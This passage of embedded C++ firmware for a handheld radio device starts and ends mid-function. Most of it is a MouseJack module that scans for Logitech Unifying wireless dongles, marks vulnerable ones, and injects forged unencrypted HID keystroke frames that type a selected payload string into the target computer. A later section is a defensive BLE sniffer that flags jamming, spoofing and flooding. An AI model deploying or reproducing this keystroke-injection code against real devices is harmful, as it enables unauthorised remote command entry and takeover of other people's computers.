  if (s_targetCount > 0 && s_targetIndex >= 0 && s_targetIndex < s_targetCount) {
    const InjTarget& t = s_targets[s_targetIndex];
    char tgt[36];
    snprintf(tgt, sizeof(tgt), "%d/%d %s", s_targetIndex + 1, s_targetCount,
             injAddrStr(t.addr).c_str());
    String s = tgt;
    if (s.length() > 22) s = s.substring(0, 22);
    injDrawStatusValue(0, s, t.vulnerable ? UI_WARN : UI_TEXT);

    char chLine[28];
    snprintf(chLine, sizeof(chLine), "%u  %s%s", (unsigned)t.channel, t.vendor,
             t.vulnerable ? " VULN" : "");
    injDrawStatusValue(1, String(chLine), t.vulnerable ? UI_WARN : UI_DIM_TEXT);
  } else {
    injDrawStatusValue(0, "none — run Scan", UI_DIM_TEXT);
    injDrawStatusValue(1, "from Scan / rescan", UI_DIM_TEXT);
  }

  String pay = kPayloads[s_payloadIndex];
  if (pay.length() > 20) pay = pay.substring(0, 20);
  injDrawStatusValue(2, pay, UI_TEXT);

  if (s_injecting) {
    injDrawStatusValue(3, "Injecting...", UI_WARN);
  } else if (s_scanning) {
    char b[28];
    snprintf(b, sizeof(b), "Scan ch%u p%02X", (unsigned)s_channel, (unsigned)s_prefixByte);
    injDrawStatusValue(3, String(b), ORANGE);
  } else {
    injDrawStatusValue(3, "Ready", UI_OK);
  }
  s_statusDirty = false;
}

static void injDrawTextBoxes() {
  const int logH = injLogBoxH();
  const int endY = injLogEndY();
  tft.fillRect(0, kInjStatusY - 2, tft.width(), endY - kInjStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kInjStatusY, tft.width() - 8, kInjStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kInjLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kInjStatPadX, kInjStatusY + 3);
  tft.print("Inject");
  tft.setCursor(kInjStatPadX, kInjLogBoxTop + 3);
  tft.print("Activity");

  static const char* kLabels[kInjStatusLines] = {"Target", "Ch", "Payload", "State"};
  for (int i = 0; i < kInjStatusLines; i++) {
    const int y = kInjStatusTextY + i * kInjLineHeight + kInjStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kInjStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void injFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_lastUiMs) < kInjUiMinIntervalMs) return;
  if (!force && !s_logDirty && !s_statusDirty) return;
  s_lastUiMs = now;
  if (s_statusDirty || force) injUpdateStatusPanel();
  if (s_logDirty || force) injRedrawLog();
}

static void injImportShared() {
  s_targetCount = 0;
  for (int i = 0; i < kMjSharedMax && s_targetCount < kInjMaxTargets; i++) {
    if (!g_mjShared[i].used) continue;
    InjTarget& t = s_targets[s_targetCount];
    memcpy(t.addr, g_mjShared[i].addr, 5);
    t.channel = g_mjShared[i].channel;
    t.vulnerable = g_mjShared[i].vulnerable;
    t.used = true;
    strncpy(t.vendor, g_mjShared[i].vendor, sizeof(t.vendor) - 1);
    t.vendor[sizeof(t.vendor) - 1] = '\0';
    if (!t.vendor[0]) strcpy(t.vendor, "nRF");
    s_targetCount++;
  }
  if (s_targetIndex >= s_targetCount) s_targetIndex = 0;
}

static int injFindTarget(const uint8_t* addr) {
  for (int i = 0; i < s_targetCount; i++) {
    if (memcmp(s_targets[i].addr, addr, 5) == 0) return i;
  }
  return -1;
}

static void injAddTarget(const uint8_t* addr, uint8_t ch, bool vulnerable, const char* vendor) {
  int idx = injFindTarget(addr);
  if (idx < 0) {
    if (s_targetCount >= kInjMaxTargets) return;
    idx = s_targetCount++;
    memset(&s_targets[idx], 0, sizeof(InjTarget));
    memcpy(s_targets[idx].addr, addr, 5);
    s_targets[idx].used = true;
  }
  s_targets[idx].channel = ch;
  if (vulnerable) s_targets[idx].vulnerable = true;
  if (vendor && vendor[0]) {
    strncpy(s_targets[idx].vendor, vendor, sizeof(s_targets[idx].vendor) - 1);
  }
  mjSharedPublish(addr, ch, vulnerable, vendor);
}

static void injConfigureRx(uint8_t prefix) {
  injDisable();
  injPowerUp();
  // 3-byte address for remnant recovery (Goodspeed-style)
  const uint8_t addr3[5] = {prefix, 0x00, 0x00, 0x00, 0x00};
  injWriteRegMulti(_INJ_RX_ADDR_P0, addr3, 5);
  injSetRegister(_INJ_SETUP_AW, 0x01);  // 3-byte address
  injSetRegister(_INJ_EN_AA, 0x00);
  injSetRegister(_INJ_EN_RXADDR, 0x01);
  injSetRegister(_INJ_SETUP_RETR, 0x00);
  injSetRegister(_INJ_RF_SETUP, 0x0F);  // 2Mbps
  injSetRegister(_INJ_RX_PW_P0, kInjPayloadMax);
  injSetRegister(_INJ_CONFIG, 0x03);    // PWR_UP | PRIM_RX, CRC off
  injSetRegister(_INJ_RF_CH, s_channel);
  injFlushRx();
  injEnable();
  delayMicroseconds(130);
}

static void injConfigureTx(const uint8_t* addr5, uint8_t ch) {
  injDisable();
  injPowerUp();
  injWriteRegMulti(_INJ_TX_ADDR, addr5, 5);
  injWriteRegMulti(_INJ_RX_ADDR_P0, addr5, 5);
  injSetRegister(_INJ_SETUP_AW, 0x03);  // 5-byte
  injSetRegister(_INJ_EN_AA, 0x00);
  injSetRegister(_INJ_EN_RXADDR, 0x01);
  injSetRegister(_INJ_SETUP_RETR, 0x00);
  injSetRegister(_INJ_RF_SETUP, 0x0F);
  injSetRegister(_INJ_RX_PW_P0, 10);
  injSetRegister(_INJ_RF_CH, ch);
  // PWR_UP | PRIM_TX | EN_CRC | CRCO (2-byte CRC) — Logitech uses ESB CRC
  injSetRegister(_INJ_CONFIG, 0x0E);
  injFlushTx();
  injFlushRx();
}

static bool injRxAvailable() {
  return (injGetRegister(_INJ_STATUS) & 0x40) != 0;
}

static void injPollScanPacket() {
  if (!injRxAvailable()) return;
  uint8_t payload[kInjPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kInjPayloadMax; i++) payload[i] = SPI.transfer(0xFF);
  digitalWrite(CSN, HIGH);
  injSetRegister(_INJ_STATUS, 0x70);

  // Reconstruct: addr = {prefix, 0x00, 0x00, p0, p1}, HID starts at p2
  // Also try HID at p0 (if full payload landed).
  uint8_t addr[5] = {(uint8_t)s_prefixByte, 0x00, 0x00, payload[0], payload[1]};
  const uint8_t* hid = payload + 2;
  int hidLen = 10;
  bool ok = injLooksLikeLogitech(hid, 10);
  if (!ok && injLooksLikeLogitech(payload, 10)) {
    // Payload already starts with HID — address incomplete; still store fingerprint addr
    hid = payload;
    ok = true;
    // Prefer using prefix + first bytes as tracking id
  }
  if (!ok) return;

  const bool vuln = (hid[1] == 0xC1 || hid[1] == 0x10 || hid[1] == 0x00);
  injAddTarget(addr, s_channel, vuln, "Logitech");
  injAppendLog(String("+ ") + injAddrStr(addr) + " ch" + String(s_channel),
               vuln ? UI_WARN : UI_OK);
  s_statusDirty = true;
}

static void injScanStep() {
  if (!s_scanning || s_injecting) return;
  const uint32_t now = millis();
  if (now - s_lastHopMs < kInjHopIntervalMs) {
    injPollScanPacket();
    return;
  }
  s_lastHopMs = now;

  // Advance prefix, then channel
  s_prefixByte++;
  if (s_prefixByte > 0x7F) {  // cover common Unifying high-bit-clear range quickly
    s_prefixByte = 0;
    s_hopIndex = (s_hopIndex + 1) % kInjChannelCount;
    s_channel = kInjChannels[s_hopIndex];
  }
  injConfigureRx((uint8_t)s_prefixByte);
  s_statusDirty = true;
  injPollScanPacket();
}

static void injStartScan() {
  s_scanning = true;
  s_prefixByte = 0;
  s_hopIndex = 0;
  s_channel = kInjChannels[0];
  injConfigureRx(0);
  injAppendLog("[+] Scanning for Unifying HID", UI_WARN);
  s_statusDirty = true;
  injFlushUi(true);
}

static void injStopScan() {
  if (!s_scanning) return;
  s_scanning = false;
  injDisable();
  injAppendLog(String("[*] Scan stop — ") + String(s_targetCount) + " targets", UI_DIM_TEXT);
  s_statusDirty = true;
  injFlushUi(true);
}

// USB HID keyboard scancodes (subset).
static bool injCharToHid(char c, uint8_t& modifier, uint8_t& key) {
  modifier = 0;
  key = 0;
  if (c >= 'a' && c <= 'z') {
    key = 0x04 + (c - 'a');
    return true;
  }
  if (c >= 'A' && c <= 'Z') {
    modifier = 0x02;  // Left Shift
    key = 0x04 + (c - 'A');
    return true;
  }
  if (c >= '1' && c <= '9') {
    key = 0x1E + (c - '1');
    return true;
  }
  if (c == '0') { key = 0x27; return true; }
  switch (c) {
    case ' ': key = 0x2C; return true;
    case '\n': case '\r': key = 0x28; return true;
    case '\t': key = 0x2B; return true;
    case '-': key = 0x2D; return true;
    case '=': key = 0x2E; return true;
    case '[': key = 0x2F; return true;
    case ']': key = 0x30; return true;
    case '\\': key = 0x31; return true;
    case ';': key = 0x33; return true;
    case '\'': key = 0x34; return true;
    case '`': key = 0x35; return true;
    case ',': key = 0x36; return true;
    case '.': key = 0x37; return true;
    case '/': key = 0x38; return true;
    case '!': modifier = 0x02; key = 0x1E; return true;
    case '@': modifier = 0x02; key = 0x1F; return true;
    case '#': modifier = 0x02; key = 0x20; return true;
    case '$': modifier = 0x02; key = 0x21; return true;
    case '%': modifier = 0x02; key = 0x22; return true;
    case '^': modifier = 0x02; key = 0x23; return true;
    case '&': modifier = 0x02; key = 0x24; return true;
    case '*': modifier = 0x02; key = 0x25; return true;
    case '(': modifier = 0x02; key = 0x26; return true;
    case ')': modifier = 0x02; key = 0x27; return true;
    case '_': modifier = 0x02; key = 0x2D; return true;
    case '+': modifier = 0x02; key = 0x2E; return true;
    case '{': modifier = 0x02; key = 0x2F; return true;
    case '}': modifier = 0x02; key = 0x30; return true;
    case '|': modifier = 0x02; key = 0x31; return true;
    case ':': modifier = 0x02; key = 0x33; return true;
    case '"': modifier = 0x02; key = 0x34; return true;
    case '<': modifier = 0x02; key = 0x36; return true;
    case '>': modifier = 0x02; key = 0x37; return true;
    case '?': modifier = 0x02; key = 0x38; return true;
    default: return false;
  }
}

static void injWritePayload(const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xA0);  // W_TX_PAYLOAD
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);

  injSetRegister(_INJ_STATUS, 0x70);
  // CE pulse to transmit
  injEnable();
  delayMicroseconds(15);
  injDisable();
  delayMicroseconds(150);
}

static void injSendHidFrame(uint8_t modifier, uint8_t key) {
  // Unencrypted Logitech Unifying keyboard frame (BN-0002 style)
  uint8_t frame[10] = {
    0x00, 0xC1, modifier, key, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  frame[9] = injLogitechChecksum(frame, 10);
  injWritePayload(frame, 10);
}

static void injSendKeepalive() {
  uint8_t payload[5];
  payload[0] = 0x00;
  payload[1] = 0x40;
  payload[2] = 0x4F;
  payload[3] = 110;
  payload[4] = 0;
  payload[4] = injLogitechChecksum(payload, 5);
  injWritePayload(payload, 5);
}

static void injTransmitString(const char* text) {
  if (s_targetCount <= 0 || s_targetIndex < 0 || s_targetIndex >= s_targetCount) {
    injAppendLog("[!] No target selected", UI_WARN);
    injFlushUi(true);
    return;
  }
  if (s_injecting) return;

  const InjTarget& t = s_targets[s_targetIndex];
  s_injecting = true;
  s_scanning = false;
  s_statusDirty = true;
  injFlushUi(true);

  injAppendLog(String("[>] Fire -> ") + injAddrStr(t.addr), UI_WARN);
  injFlushUi(true);

  injConfigureTx(t.addr, t.channel);
  injSendKeepalive();
  delay(5);

  // Also try nearby channels (dongles hop)
  const int chTry[3] = {t.channel, (t.channel + 1) % 84, (t.channel + 83) % 84};

  for (size_t ci = 0; text[ci]; ci++) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) break;

    uint8_t mod = 0, key = 0;
    if (!injCharToHid(text[ci], mod, key)) continue;

    for (int c = 0; c < 3; c++) {
      injSetRegister(_INJ_RF_CH, (uint8_t)chTry[c]);
      injSendHidFrame(mod, key);           // key down
      delay(kInjKeyDelayMs);
      injSendHidFrame(0x00, 0x00);         // key up
      delay(kInjKeyDelayMs);
    }
    s_injectCount++;

    if ((ci % 4) == 0) {
      maintainTouchNavBar();
      runUI();
      s_statusDirty = true;
      injFlushUi(false);
    }
  }

  injSendKeepalive();
  injDisable();
  injAppendLog(String("[+] Done (") + String(strlen(text)) + " chars)", UI_OK);
  s_injecting = false;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injPrevTarget() {
  if (s_targetCount <= 0) return;
  s_targetIndex = (s_targetIndex - 1 + s_targetCount) % s_targetCount;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injNextTarget() {
  if (s_targetCount <= 0) return;
  s_targetIndex = (s_targetIndex + 1) % s_targetCount;
  s_statusDirty = true;
  injFlushUi(true);
}

static void injNextPayload() {
  s_payloadIndex = (s_payloadIndex + 1) % kPayloadCount;
  s_statusDirty = true;
  injAppendLog(String("[*] Payload: ") + kPayloads[s_payloadIndex], UI_DIM_TEXT);
  injFlushUi(true);
}

static void injToggleScanOrFire() {
  // UP = Fire
  injStopScan();
  injTransmitString(kPayloads[s_payloadIndex]);
}

static unsigned long s_injLastBtnMs = 0;

static void injWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) delay(5);
  delay(30);
}

void injHandleNavButtons() {
  if (!featureHasTouchNavBar()) return;
  if (millis() - s_injLastBtnMs < 80) return;

  // Remapped layout: SELECT=Fire (the most important action, was UP), UP=Prev
  // target (was LEFT), DOWN=Next target (was RIGHT; Prev/Next always sit on
  // UP/DOWN), RIGHT=Pay/Stop scan (secondary, was DOWN). LEFT is the
  // universal Exit, handled in mouseJackInjectLoop(). Also switched from
  // isTouchNavButtonPressedEdge (touch-tap only) to isButtonPressedEdge so
  // the physical buttons actually trigger these actions too.
  if (isButtonPressedEdge(BTN_UP)) {
    injPrevTarget();
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    injNextTarget();
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (s_scanning) {
      injStopScan();
    } else {
      injNextPayload();
    }
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_targetCount == 0 || s_scanning) {
      if (s_scanning) injStopScan();
      else injStartScan();
    } else {
      injToggleScanOrFire();
    }
    s_injLastBtnMs = millis();
    injWaitNavRelease(BTN_SELECT);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 16;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_start,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i]) tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, UI_ICON);
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: injPrevTarget(); break;
        case 1:
          if (s_scanning) injStopScan();
          else injStartScan();
          break;
        case 2:
          if (s_targetCount == 0) injStartScan();
          else injToggleScanOrFire();
          break;
        case 3: injNextTarget(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                s_active = false;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void mouseJackInjectSetup() {
  setTouchButtonInputEnabled(true);
  bleSetMjInjectNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  s_active = true;
  s_scanning = false;
  s_injecting = false;
  s_channel = kInjChannels[0];
  s_hopIndex = 0;
  s_prefixByte = 0;
  s_lastHopMs = millis();
  s_payloadIndex = 0;
  s_injectCount = 0;
  s_logIndex = 0;
  s_logDirty = false;
  s_statusDirty = false;
  s_lastUiMs = 0;

  for (int i = 0; i < kInjMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kInjMaxTargets; i++) s_targets[i].used = false;

  injImportShared();
  s_targetIndex = 0;

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  injDrawTextBoxes();
  injAppendLog("[+] MouseJack Inject ready", UI_WARN);
  if (s_targetCount > 0) {
    injAppendLog(String("[*] Imported ") + String(s_targetCount) + " from scanner", UI_OK);
  } else {
    injAppendLog("[*] Fire/Scan to find targets", UI_DIM_TEXT);
  }
  s_statusDirty = true;
  injFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  injInitSpi();
  injDisable();
  injPowerUp();
  redrawTouchButtonBar();
}

void mouseJackInjectLoop() {
  s_active = true;
  while (s_active) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
      feature_exit_requested = true;
      s_active = false;
      break;
    }
    injHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    if (s_scanning) injScanStep();
    injFlushUi(false);
    delay(1);
  }
}

void exit() {
  s_active = false;
  s_scanning = false;
  s_injecting = false;
  injDisable();
  injPowerDown();
  digitalWrite(CSN, HIGH);
  restoreSdAfterSharedSpi();
}

}  // namespace MouseJackInject

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back
};

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 20;
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 5;
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long lastSeen = 0;
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

class BluetoothSniffer {
private:
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  BLEAdvertisedDeviceCallbacks* bleDeviceCallbacks = nullptr;
  static BluetoothSniffer* snifferInstance;

  void releaseBleCallbacks() {
    if (pBLEScan) {
      pBLEScan->stop();
      pBLEScan->setAdvertisedDeviceCallbacks(nullptr);
    }
    delete bleDeviceCallbacks;
    bleDeviceCallbacks = nullptr;
  }

  static int snifferContentTop() {
    return Y_OFFSET + HEADER_HEIGHT;
  }

  static int snifferVisibleLines() {
    return bleMaxLinesInZone(snifferContentTop(), LINE_HEIGHT);
  }

  static bool snifferLineFits(int lineIndex) {
    const int y = snifferContentTop() + (lineIndex * LINE_HEIGHT);
    return y + LINE_HEIGHT <= bleContentBottom();
  }

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    setupTouchscreen();
    {
      const int bodyH = bleContentBottom() - 37;
      if (bodyH > 0) {
        tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
      }
    }
    tft.setTextSize(1);
    updateHeader();

  }

  void updateHeader() {
    if (!scanning) return;
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawFastHLine(0, 56, 240, UI_LINE);
  }

  void updateDisplay() {
    if (!scanning) return;
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = 0; i < visibleLines; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      if (!snifferLineFits(i)) continue;
      int y = snifferContentTop() + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < visibleLines - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type && snifferLineFits(i + 1)) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, snifferContentTop() + 10);
    }
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (!scanning) return;
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = visibleLines - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    for (int i = visibleLines; i < MAX_LINES; i++) {
      displayLines[i].text = "";
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
